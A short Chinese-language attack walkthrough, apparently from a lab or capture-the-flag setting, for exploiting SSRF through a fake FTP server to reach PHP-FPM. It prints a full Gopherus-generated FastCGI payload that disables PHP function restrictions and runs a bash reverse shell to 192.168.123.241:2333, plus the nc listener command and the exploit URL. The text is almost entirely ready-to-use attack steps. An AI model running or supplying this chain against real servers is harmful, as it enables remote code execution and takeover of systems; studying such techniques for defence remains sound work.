# 首先使用 Gopherus 生成 Payload： 
## /usr/share/nginx/html/index.php
## bash -c "bash -i >& /dev/tcp/192.168.123.241/2333 0>&1 "


# 得到的 Payload 只要 _ 后面的部分：
# %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0D%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.123.241/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
# 然后还是在攻击机上运行 evil_ftp.py 启动一个伪 FTP 服务：

# 1. 运行ftp服务：python2 evil_ftp.py
# 2. 开启 nc 监听，等待反弹shell： nc -lvvp 2333
# 3. 访问 http://hacktop.com/ssrf_2.php?file=ftp://192.168.123.241:23/123&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0D%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.123.241/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00